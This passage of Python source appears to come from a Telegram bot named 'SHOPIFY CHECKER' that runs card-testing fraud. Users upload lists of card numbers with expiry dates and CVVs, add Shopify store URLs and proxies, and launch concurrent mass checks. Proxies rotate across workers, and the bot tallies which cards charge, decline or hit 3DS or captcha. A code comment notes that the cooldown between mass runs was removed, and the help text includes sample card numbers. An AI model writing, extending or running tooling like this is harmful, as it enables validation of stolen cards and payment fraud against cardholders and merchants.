            
            row = await self.db.fetch_one(
                "SELECT * FROM rate_limits WHERE user_id = ?",
                (user_id,)
            )
            
            if not row:
                await self.db.execute(
                    """INSERT INTO rate_limits 
                       (user_id, last_check, checks_today, last_mass, mass_count_hour, last_reset)
                       VALUES (?, ?, ?, ?, ?, ?)""",
                    (user_id, datetime.now(), 0, None, 0, today)
                )
                return True, ""
            
            last_reset = datetime.fromisoformat(row["last_reset"]).date()
            if last_reset < today:
                await self.db.execute(
                    "UPDATE rate_limits SET checks_today = 0, mass_count_hour = 0, last_reset = ? WHERE user_id = ?",
                    (today, user_id)
                )
                checks_today = 0
                mass_count_hour = 0
            else:
                checks_today = row["checks_today"]
                mass_count_hour = row["mass_count_hour"]
            
            if command == "mass":
                if mass_count_hour >= Settings.MASS_LIMIT_PER_HOUR:
                    return False, f"⚠️ Máximo {Settings.MASS_LIMIT_PER_HOUR} mass/hora"
                # COOLDOWN ELIMINADO - no hay espera entre mass
            
            elif command == "check":
                if checks_today >= Settings.DAILY_LIMIT_CHECKS:
                    return False, f"📅 Límite diario ({Settings.DAILY_LIMIT_CHECKS}) alcanzado"
                
                if row.get("last_check"):
                    last_check = datetime.fromisoformat(row["last_check"])
                    elapsed = (datetime.now() - last_check).seconds
                    if elapsed < Settings.RATE_LIMIT_SECONDS:
                        wait = Settings.RATE_LIMIT_SECONDS - elapsed
                        return False, f"⏳ Espera {wait}s"
            
            return True, ""

    async def increment_checks(self, user_id: int, command: str):
        now = datetime.now()
        
        if command == "mass":
            await self.db.execute(
                """UPDATE rate_limits SET 
                   mass_count_hour = mass_count_hour + 1,
                   last_mass = ?
                   WHERE user_id = ?""",
                (now, user_id)
            )
        else:
            await self.db.execute(
                """UPDATE rate_limits SET 
                   checks_today = checks_today + 1,
                   last_check = ?
                   WHERE user_id = ?""",
                (now, user_id)
            )

    async def get_optimal_workers(self, user_id: int, proxies: List[str]) -> int:
        return min(len(proxies), Settings.MAX_WORKERS_PER_USER)

    async def is_admin(self, user_id: int) -> bool:
        return user_id in Settings.ADMIN_IDS

# ================== CARD CHECK SERVICE ==================
class CardCheckService:
    def __init__(self, db: Database, user_manager: UserManager):
        self.db = db
        self.user_manager = user_manager

    async def check_single(self, user_id: int, card_data: Dict, site: str, proxy: str) -> JobResult:
        timeout = aiohttp.ClientTimeout(
            total=None,
            connect=Settings.TIMEOUT_CONFIG["connect"],
            sock_read=Settings.TIMEOUT_CONFIG["sock_read"]
        )
        
        job = Job(
            site=site,
            proxy=proxy,
            card_data=card_data,
            job_id=0
        )
        
        async with aiohttp.ClientSession(timeout=timeout) as session:
            result = await JobExecutor.execute(job, session)
        
        await self.db.save_job_result(user_id, result)
        await self.db.update_learning(user_id, result)
        
        return result

    async def check_mass(
        self, 
        user_id: int,
        cards: List[Dict],
        sites: List[str],
        proxies: List[str],
        progress_callback=None
    ) -> Tuple[List[JobResult], Dict[str, int], float]:
        
        total_cards = len(cards)
        
        # Crear jobs
        jobs = []
        for i, card in enumerate(cards):
            site = sites[i % len(sites)]
            proxy = proxies[i % len(proxies)]
            
            job = Job(
                site=site,
                proxy=proxy,
                card_data=card,
                job_id=i
            )
            jobs.append(job)
        
        queue = asyncio.Queue()
        for job in jobs:
            await queue.put(job)
        
        results = [None] * len(jobs)
        
        processed = 0
        counts = {
            "charged": 0,
            "declined": 0,
            "declined_likely": 0,
            "captcha": 0,
            "three_ds": 0,
            "timeout": 0,
            "unknown": 0
        }
        start_time = time.time()
        
        counter_lock = asyncio.Lock()
        running = True
        
        num_workers = min(len(proxies), Settings.MAX_WORKERS_PER_USER, total_cards)
        
        timeout_cfg = aiohttp.ClientTimeout(
            total=None,
            connect=Settings.TIMEOUT_CONFIG["connect"],
            sock_read=Settings.TIMEOUT_CONFIG["sock_read"]
        )
        
        async def progress_updater():
            nonlocal processed, counts
            while running or processed < total_cards:
                await asyncio.sleep(0.5)
                
                if progress_callback:
                    async with counter_lock:
                        await progress_callback(processed, counts, total_cards)
        
        async def worker(worker_id: int):
            nonlocal processed, counts
            
            async with aiohttp.ClientSession(timeout=timeout_cfg) as session:
                while True:
                    if cancel_mass.get(user_id, False):
                        break
                    
                    try:
                        job = await queue.get()
                    except asyncio.QueueEmpty:
                        break
                    
                    result = await JobExecutor.execute(job, session)
                    
                    results[job.job_id] = result
                    
                    async with counter_lock:
                        if result.status == CheckStatus.CHARGED:
                            counts["charged"] += 1
                        elif result.status == CheckStatus.DECLINED:
                            counts["declined"] += 1
                        elif result.status == CheckStatus.DECLINED_LIKELY:
                            counts["declined_likely"] += 1
                        elif result.status == CheckStatus.CAPTCHA_REQUIRED:
                            counts["captcha"] += 1
                        elif result.status == CheckStatus.THREE_DS_REQUIRED:
                            counts["three_ds"] += 1
                        elif "timeout" in result.status.value:
                            counts["timeout"] += 1
                        else:
                            counts["unknown"] += 1
                        
                        processed += 1
                    
                    await self.db.save_job_result(user_id, result)
                    await self.db.update_learning(user_id, result)
                    
                    queue.task_done()
        
        updater_task = asyncio.create_task(progress_updater())
        
        worker_tasks = []
        for i in range(num_workers):
            task = asyncio.create_task(worker(i))
            worker_tasks.append(task)
        
        await queue.join()
        
        running = False
        await updater_task
        
        for task in worker_tasks:
            if not task.done():
                task.cancel()
        
        await asyncio.gather(*worker_tasks, return_exceptions=True)
        
        elapsed = time.time() - start_time
        
        return results, counts, elapsed

# ================== VARIABLES GLOBALES ==================
db = None
user_manager = None
card_service = None
cancel_mass = {}
user_state = {}
active_mass = set()

# ================== MENÚ PRINCIPAL ==================
async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, edit: bool = False):
    text = (
        "🤖 *SHOPIFY CHECKER*\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        "Elige una opción:"
    )
    
    keyboard = [
        [InlineKeyboardButton("💳 CHECK CARD", callback_data="menu_check")],
        [InlineKeyboardButton("📦 MASS CHECK", callback_data="menu_mass")],
        [InlineKeyboardButton("🌐 SITES", callback_data="menu_sites")],
        [InlineKeyboardButton("🔌 PROXIES", callback_data="menu_proxies")],
        [InlineKeyboardButton("🧾 CARDS", callback_data="menu_cards")],
        [InlineKeyboardButton("📊 STATS", callback_data="menu_stats")],
        [InlineKeyboardButton("⚙️ SETTINGS", callback_data="menu_settings")],
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if edit:
        await update.callback_query.edit_message_text(
            text, parse_mode="Markdown", reply_markup=reply_markup
        )
    else:
        await update.message.reply_text(text, parse_mode="Markdown", reply_markup=reply_markup)

# ================== SUBMENÚ CHECK CARD ==================
async def show_check_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "💳 *CHECK CARD*\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        "Selecciona una opción:"
    )
    
    keyboard = [
        [InlineKeyboardButton("▶️ Check one card", callback_data="check_one")],
        [InlineKeyboardButton("ℹ️ How it works", callback_data="check_howto")],
        [InlineKeyboardButton("🔙 Back", callback_data="menu_main")],
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(
        text, parse_mode="Markdown", reply_markup=reply_markup
    )

async def check_howto(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "💳 *HOW TO CHECK A CARD*\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        "Send the card in this format:\n"
        "`NUMBER|MONTH|YEAR|CVV`\n\n"
        "Example:\n"
        "`4377110010309114|08|2026|501`\n\n"
        "The bot will automatically use your first site and proxy."
    )
    
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_check")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(
        text, parse_mode="Markdown", reply_markup=reply_markup
    )

# ================== SUBMENÚ MASS CHECK ==================
async def show_mass_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data = await user_manager.get_user_data(user_id)
    
    cards_count = len(user_data["cards"])
    sites_count = len(user_data["sites"])
    proxies_count = len(user_data["proxies"])
    
    status = []
    if cards_count == 0:
        status.append("❌ No cards")
    if sites_count == 0:
        status.append("❌ No sites")
    if proxies_count == 0:
        status.append("❌ No proxies")
    
    text = (
        "📦 *MASS CHECK*\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        "*Steps:*\n"
        "1️⃣ Add cards (.txt)\n"
        "2️⃣ Add sites\n"
        "3️⃣ Add proxies\n"
        "4️⃣ Start mass check\n\n"
        f"*Current status:*\n"
        f"• Cards: {cards_count}\n"
        f"• Sites: {sites_count}\n"
        f"• Proxies: {proxies_count}\n"
    )
    
    if status:
        text += f"\n⚠️ {', '.join(status)}"
    
    keyboard = []
    
    if cards_count > 0 and sites_count > 0 and proxies_count > 0:
        keyboard.append([InlineKeyboardButton("▶️ Start mass", callback_data="mass_start")])
    
    keyboard.append([InlineKeyboardButton("📄 Upload cards", callback_data="mass_upload")])
    keyboard.append([InlineKeyboardButton("⚙️ Workers settings", callback_data="mass_workers")])
    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="menu_main")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(
        text, parse_mode="Markdown", reply_markup=reply_markup
    )

async def mass_workers_settings(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "⚙️ *WORKERS SETTINGS*\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        f"Current max workers: `{Settings.MAX_WORKERS_PER_USER}`\n\n"
        "Workers are automatically optimized based on:\n"
        "• Number of alive proxies\n"
        "• Timeout rate\n\n"
        "To change the limit, use the command:\n"
        "`/setworkers [number]`"
    )
    
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_mass")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(
        text, parse_mode="Markdown", reply_markup=reply_markup
    )

# ================== SUBMENÚ SITES ==================
async def show_sites_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data = await user_manager.get_user_data(user_id)
    sites = user_data["sites"]
    
    text = (
        "🌐 *SITES MANAGER*\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        f"Total sites: `{len(sites)}`\n\n"
        "What do you want to do?"
    )
    
    keyboard = [
        [InlineKeyboardButton("➕ Add site", callback_data="sites_add")],
        [InlineKeyboardButton("📃 List sites", callback_data="sites_list")],
        [InlineKeyboardButton("❌ Remove site", callback_data="sites_remove")],
        [InlineKeyboardButton("🔙 Back", callback_data="menu_main")],
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(
        text, parse_mode="Markdown", reply_markup=reply_markup
    )

async def sites_add_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "➕ *ADD SITE*\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        "Send the Shopify store URL:\n"
        "Example:\n"
        "`mystore.myshopify.com`\n\n"
        "Or full URL:\n"
        "`https://mystore.myshopify.com`"
    )
    
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_sites")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(
        text, parse_mode="Markdown", reply_markup=reply_markup
    )
    
    user_state[update.effective_user.id] = "awaiting_site_url"

async def sites_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data = await user_manager.get_user_data(user_id)
    sites = user_data["sites"]
    
    if not sites:
        text = "📭 *No sites saved.*"
    else:
        lines = ["📃 *YOUR SITES*", "━━━━━━━━━━━━━━━━━━", ""]
        for i, site in enumerate(sites, 1):
            lines.append(f"{i}. {site}")
        text = "\n".join(lines)
    
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_sites")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(
        text, parse_mode="Markdown", reply_markup=reply_markup
    )

async def sites_remove_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data = await user_manager.get_user_data(user_id)
    sites = user_data["sites"]
    
    if not sites:
        text = "📭 *No sites to remove.*"
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_sites")]]
    else:
        text = "❌ *REMOVE SITE*\n━━━━━━━━━━━━━━━━━━\n\nSelect a site to remove:"
        keyboard = []
        for i, site in enumerate(sites, 1):
            keyboard.append([InlineKeyboardButton(f"{i}. {site[:30]}...", callback_data=f"remove_site_{i}")])
        keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="menu_sites")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(
        text, parse_mode="Markdown", reply_markup=reply_markup
    )

# ================== SUBMENÚ PROXIES ==================
async def show_proxies_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data = await user_manager.get_user_data(user_id)
    proxies = user_data["proxies"]
    
    text = (
        "🔌 *PROXIES MANAGER*\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        f"Total proxies: `{len(proxies)}`\n\n"
        "What do you want to do?"
    )
    
    keyboard = [
        [InlineKeyboardButton("➕ Add proxy", callback_data="proxies_add")],
        [InlineKeyboardButton("📃 List proxies", callback_data="proxies_list")],
        [InlineKeyboardButton("❤️ Proxy health", callback_data="proxies_health")],
        [InlineKeyboardButton("🗑️ Clean dead proxies", callback_data="proxies_clean")],
        [InlineKeyboardButton("🔙 Back", callback_data="menu_main")],
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(
        text, parse_mode="Markdown", reply_markup=reply_markup
    )

async def proxies_add_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "➕ *ADD PROXY*\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        "Send the proxy in one of these formats:\n"
        "• `ip:port`\n"
        "• `ip:port:user:pass`\n\n"
        "Examples:\n"
        "`205.209.118.30:3138`\n"
        "`p.webshare.io:80:user:pass`"
    )
    
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_proxies")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(
        text, parse_mode="Markdown", reply_markup=reply_markup
    )
    
    user_state[update.effective_user.id] = "awaiting_proxy"

async def proxies_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data = await user_manager.get_user_data(user_id)
    proxies = user_data["proxies"]
    
    if not proxies:
        text = "📭 *No proxies saved.*"
    else:
        lines = ["📃 *YOUR PROXIES*", "━━━━━━━━━━━━━━━━━━", ""]
        for i, p in enumerate(proxies, 1):
            display = p.split(':')[0] + ':' + p.split(':')[1]
            lines.append(f"{i}. `{display}`")
        text = "\n".join(lines)
    
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_proxies")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(
        text, parse_mode="Markdown", reply_markup=reply_markup
    )

async def proxies_health(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data = await user_manager.get_user_data(user_id)
    proxies = user_data["proxies"]
    
    if not proxies:
        text = "📭 *No proxies to check.*"
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_proxies")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.callback_query.edit_message_text(text, parse_mode="Markdown", reply_markup=reply_markup)
        return
    
    await update.callback_query.edit_message_text("🔄 Checking proxies...")
    
    health_checker = ProxyHealthChecker(db, user_id)
    results = await health_checker.check_all_proxies(proxies)
    
    alive = [r for r in results if r["alive"]]
    dead = [r for r in results if not r["alive"]]
    
    lines = [
        "❤️ *PROXY HEALTH RESULTS*",
        "━━━━━━━━━━━━━━━━━━",
        f"",
        f"✅ Alive: {len(alive)}",
        f"❌ Dead: {len(dead)}",
    ]
    
    if alive:
        lines.append(f"\n✅ *Fastest:*")
        for i, r in enumerate(sorted(alive, key=lambda x: x["response_time"])[:3]):
            display = r['proxy'].split(':')[0] + ':' + r['proxy'].split(':')[1]
            lines.append(f"  {i+1}. `{display}` · {r['response_time']:.2f}s")
    
    if dead and dead[0].get("error"):
        lines.append(f"\n⚠️ *Sample error:* {dead[0]['error']}")
    
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_proxies")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(
        "\n".join(lines), parse_mode="Markdown", reply_markup=reply_markup
    )

async def proxies_clean_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "🗑️ *CLEAN DEAD PROXIES*\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        "Are you sure you want to remove all dead proxies?\n\n"
        "This action cannot be undone."
    )
    
    keyboard = [
        [InlineKeyboardButton("✅ Yes", callback_data="proxies_clean_yes")],
        [InlineKeyboardButton("❌ Cancel", callback_data="menu_proxies")],
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(
        text, parse_mode="Markdown", reply_markup=reply_markup
    )

async def proxies_clean_execute(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data = await user_manager.get_user_data(user_id)
    proxies = user_data["proxies"]
    
    if not proxies:
        await update.callback_query.edit_message_text("📭 No proxies to clean.")
        return
    
    await update.callback_query.edit_message_text("🔄 Cleaning proxies...")
    
    health_checker = ProxyHealthChecker(db, user_id)
    results = await health_checker.check_all_proxies(proxies)
    
    alive_proxies = [r["proxy"] for r in results if r["alive"]]
    dead_count = len([r for r in results if not r["alive"]])
    
    await user_manager.update_user_data(user_id, proxies=alive_proxies)
    
    text = (
        f"🗑️ *CLEAN COMPLETE*\n"
        f"━━━━━━━━━━━━━━━━━━\n\n"
        f"✅ Kept: {len(alive_proxies)}\n"
        f"❌ Removed: {dead_count}"
    )
    
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_proxies")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(
        text, parse_mode="Markdown", reply_markup=reply_markup
    )

# ================== SUBMENÚ CARDS ==================
async def show_cards_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data = await user_manager.get_user_data(user_id)
    cards = user_data["cards"]
    
    text = (
        "🧾 *CARDS MANAGER*\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        f"Total cards: `{len(cards)}`\n\n"
        "What do you want to do?"
    )
    
    keyboard = [
        [InlineKeyboardButton("📄 Upload cards (.txt)", callback_data="cards_upload")],
        [InlineKeyboardButton("📃 List cards", callback_data="cards_list")],
        [InlineKeyboardButton("❌ Remove card", callback_data="cards_remove")],
        [InlineKeyboardButton("🔙 Back", callback_data="menu_main")],
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(
        text, parse_mode="Markdown", reply_markup=reply_markup
    )

async def cards_upload_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "📄 *UPLOAD CARDS*\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        "Send a `.txt` file with cards in this format:\n"
        "`NUMBER|MONTH|YEAR|CVV`\n\n"
        "Example:\n"
        "`4377110010309114|08|2026|501`\n"
        "`5355221247797089|02|2028|986`\n\n"
        "One card per line."
    )
    
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_cards")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(
        text, parse_mode="Markdown", reply_markup=reply_markup
    )
    
    user_state[update.effective_user.id] = "awaiting_cards_file"

async def cards_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data = await user_manager.get_user_data(user_id)
    cards = user_data["cards"]
    
    if not cards:
        text = "📭 *No cards saved.*"
    else:
        lines = ["📃 *YOUR CARDS*", "━━━━━━━━━━━━━━━━━━", ""]
        for i, card in enumerate(cards, 1):
            bin_code = card.split('|')[0][:6]
            last4 = card.split('|')[0][-4:]
            lines.append(f"{i}. `{bin_code}xxxxxx{last4}`")
        if len(cards) > 10:
            lines.append(f"\n... and {len(cards)-10} more.")
        text = "\n".join(lines)
    
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_cards")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(
        text, parse_mode="Markdown", reply_markup=reply_markup
    )

async def cards_remove_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data = await user_manager.get_user_data(user_id)
    cards = user_data["cards"]
    
    if not cards:
        text = "📭 *No cards to remove.*"
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_cards")]]
    else:
        text = "❌ *REMOVE CARD*\n━━━━━━━━━━━━━━━━━━\n\nSelect a card to remove:"
        keyboard = []
        for i, card in enumerate(cards, 1):
            bin_code = card.split('|')[0][:6]
            last4 = card.split('|')[0][-4:]
            keyboard.append([InlineKeyboardButton(f"{i}. {bin_code}xxxxxx{last4}", callback_data=f"remove_card_{i}")])
        keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="menu_cards")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(
        text, parse_mode="Markdown", reply_markup=reply_markup
    )

# ================== SUBMENÚ STATS ==================
async def show_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    stats = await db.get_stats(user_id)
    
    text = (
        f"📊 *ESTADÍSTICAS*\n"
        f"━━━━━━━━━━━━━━━━━━\n\n"
        f"Total checks: {stats['total']}\n"
        f"✅ Charged: {stats['charged']}\n"
        f"❌ Declined: {stats['declined']}\n"
        f"⚠️ Declined (likely): {stats['declined_likely']}\n"
        f"🤖 Captcha: {stats['captcha']}\n"
        f"🔒 3DS: {stats['three_ds']}\n"
        f"⏱️ Timeout: {stats['timeout']}\n"
        f"❓ Unknown: {stats['unknown']}"
    )
    
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_main")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await update.callback_query.edit_message_text(
            text, parse_mode="Markdown", reply_markup=reply_markup
        )
    else:
        await update.message.reply_text(text, parse_mode="Markdown", reply_markup=reply_markup)

# ================== SUBMENÚ SETTINGS ==================
async def show_settings(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "⚙️ *SETTINGS*\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        "Current configuration:"
    )
    
    keyboard = [
        [InlineKeyboardButton("⚡ Workers count", callback_data="settings_workers")],
        [InlineKeyboardButton("⏱ Timeout info", callback_data="settings_timeout")],
        [InlineKeyboardButton("🔒 Usage rules", callback_data="settings_rules")],
        [InlineKeyboardButton("🔙 Back", callback_data="menu_main")],
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(
        text, parse_mode="Markdown", reply_markup=reply_markup
    )

async def settings_workers(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "⚡ *WORKERS CONFIGURATION*\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        f"Max workers per user: `{Settings.MAX_WORKERS_PER_USER}`\n\n"
        "Workers are automatically optimized based on:\n"
        "• Number of alive proxies\n"
        "• Timeout rate (>20% reduces workers)\n\n"
        "To change the limit, use:\n"
        "`/setworkers [number]`"
    )
    
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_settings")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(
        text, parse_mode="Markdown", reply_markup=reply_markup
    )

async def settings_timeout(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "⏱ *TIMEOUT CONFIGURATION*\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        f"Connect timeout: `{Settings.TIMEOUT_CONFIG['connect']}s` (proxy malo muere rápido)\n"
        f"Read timeout: `{Settings.TIMEOUT_CONFIG['sock_read']}s` (Shopify puede tardar)\n"
        f"Total timeout: `None` (NO matar procesos válidos)\n"
        f"Body read timeout: `{Settings.TIMEOUT_CONFIG['response_body']}s`\n"
        f"BIN lookup timeout: `{Settings.TIMEOUT_CONFIG['bin_lookup']}s`"
    )
    
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_settings")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(
        text, parse_mode="Markdown", reply_markup=reply_markup
    )

async def settings_rules(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "🔒 *USAGE RULES*\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        f"• Daily limit: `{Settings.DAILY_LIMIT_CHECKS}` checks\n"
        f"• Mass limit: `{Settings.MASS_LIMIT_PER_HOUR}` per hour\n"
        f"• Rate limit: `{Settings.RATE_LIMIT_SECONDS}s` between checks\n\n"
        "These limits protect the bot from abuse."
    )
    
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_settings")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(
        text, parse_mode="Markdown", reply_markup=reply_markup
    )

# ================== INICIAR MASS CHECK ==================
async def mass_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = update.effective_user.id
    
    allowed, msg = await user_manager.check_rate_limit(user_id, "mass")
    if not allowed:
        await query.edit_message_text(msg)
        return
    
    user_data = await user_manager.get_user_data(user_id)
    cards = user_data["cards"]
    sites = user_data["sites"]
    proxies = user_data["proxies"]
    
    if not cards or not sites or not proxies:
        await query.edit_message_text("❌ Missing cards, sites or proxies.")
        await asyncio.sleep(2)
        await show_mass_menu(update, context)
        return
    
    valid_cards = []
    for card_str in cards:
        card_data = CardValidator.parse_card(card_str)
        if card_data:
            valid_cards.append(card_data)
    
    if not valid_cards:
        await query.edit_message_text("❌ No valid cards found.")
        return
    
    active_mass.add(user_id)
    cancel_mass[user_id] = False
    
    bar = create_progress_bar(0, len(valid_cards))
    text = (
        f"📦 *MASS CHECK IN PROGRESS*\n"
        f"━━━━━━━━━━━━━━━━━━\n\n"
        f"Progress: {bar} 0/{len(valid_cards)}\n\n"
        f"✅ Approved: 0\n"
        f"❌ Declined: 0\n"
        f"⚠️ Likely: 0\n"
        f"🤖 Captcha: 0\n"
        f"🔒 3DS: 0\n"
        f"⏱ Timeout: 0\n"
        f"❓ Unknown: 0\n\n"
        f"⚡ Speed: 0.0 cards/s\n"
        f"⏳ Elapsed: 0s"
    )
    
    keyboard = [[InlineKeyboardButton("⏹ STOP", callback_data="mass_stop")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    progress_msg = await query.edit_message_text(
        text, parse_mode="Markdown", reply_markup=reply_markup
    )
    
    async def progress_callback(proc: int, counts: Dict, total: int):
        if cancel_mass.get(user_id, False):
            return
        
        elapsed = time.time() - start_time
        speed = proc / elapsed if elapsed > 0 else 0
        bar = create_progress_bar(proc, total)
        
        text = (
            f"📦 *MASS CHECK IN PROGRESS*\n"
            f"━━━━━━━━━━━━━━━━━━\n\n"
            f"Progress: {bar} {proc}/{total}\n\n"
            f"✅ Charged: {counts['charged']}\n"
            f"❌ Declined: {counts['declined']}\n"
            f"⚠️ Likely: {counts['declined_likely']}\n"
            f"🤖 Captcha: {counts['captcha']}\n"
            f"🔒 3DS: {counts['three_ds']}\n"
            f"⏱ Timeout: {counts['timeout']}\n"
            f"❓ Unknown: {counts['unknown']}\n\n"
            f"⚡ Speed: {speed:.1f} cards/s\n"
            f"⏳ Elapsed: {format_time(elapsed)}"
        )
        
        try:
            await progress_msg.edit_text(text, parse_mode="Markdown", reply_markup=reply_markup)
        except:
            pass
    
    start_time = time.time()
    results, counts, elapsed = await card_service.check_mass(
        user_id=user_id,
        cards=valid_cards,
        sites=sites,
        proxies=proxies,
        progress_callback=progress_callback
    )
    
    await user_manager.increment_checks(user_id, "mass")
    active_mass.discard(user_id)
    
    if cancel_mass.get(user_id, False):
        cancel_mass[user_id] = False
        text = (
            f"⏹ *PROCESS STOPPED*\n"
            f"━━━━━━━━━━━━━━━━━━\n\n"
            f"Processed: {len(results)}/{len(valid_cards)}\n"
            f"✅ Charged: {counts['charged']}\n"
            f"❌ Declined: {counts['declined']}\n"
            f"⚠️ Likely: {counts['declined_likely']}\n"
            f"🤖 Captcha: {counts['captcha']}\n"
            f"🔒 3DS: {counts['three_ds']}\n"
            f"⏱ Timeout: {counts['timeout']}\n"
            f"❓ Unknown: {counts['unknown']}\n\n"
            f"⏳ Elapsed: {format_time(elapsed)}"
        )
        keyboard = [[InlineKeyboardButton("🔙 Back to Mass", callback_data="menu_mass")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await progress_msg.edit_text(text, parse_mode="Markdown", reply_markup=reply_markup)
        return
    
    avg_speed = len(valid_cards) / elapsed if elapsed > 0 else 0
    text = (
        f"✅ *MASS CHECK COMPLETED*\n"
        f"━━━━━━━━━━━━━━━━━━\n\n"
        f"Processed: {len(valid_cards)} cards\n"
        f"✅ Charged: {counts['charged']}\n"
        f"❌ Declined: {counts['declined']}\n"
        f"⚠️ Likely: {counts['declined_likely']}\n"
        f"🤖 Captcha: {counts['captcha']}\n"
        f"🔒 3DS: {counts['three_ds']}\n"
        f"⏱ Timeout: {counts['timeout']}\n"
        f"❓ Unknown: {counts['unknown']}\n\n"
        f"⏱ Time: {format_time(elapsed)}\n"
        f"⚡ Avg speed: {avg_speed:.1f} cards/s"
    )
    
    keyboard = [
        [InlineKeyboardButton("📄 Download results", callback_data="mass_download")],
        [InlineKeyboardButton("🔙 Back to menu", callback_data="menu_main")]
    ]
